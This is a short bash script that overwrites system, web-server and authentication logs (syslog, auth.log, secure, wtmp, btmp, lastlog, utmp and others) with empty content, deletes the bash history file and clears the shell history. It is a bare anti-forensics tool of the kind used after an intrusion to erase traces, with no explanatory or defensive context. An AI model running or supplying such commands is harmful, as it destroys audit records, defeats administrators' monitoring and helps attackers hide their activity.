#!/usr/bin/bash
echo > /var/log/syslog
echo > /var/log/messages
echo > /var/log/httpd/access_log
echo > /var/log/httpd/error_log
echo > /var/log/xferlog
echo > /var/log/secure
echo > /var/log/auth.log
echo > /var/log/user.log
echo > /var/log/wtmp
echo > /var/log/lastlog
echo > /var/log/btmp
echo > /var/run/utmp
rm ~/./bash_history
history -c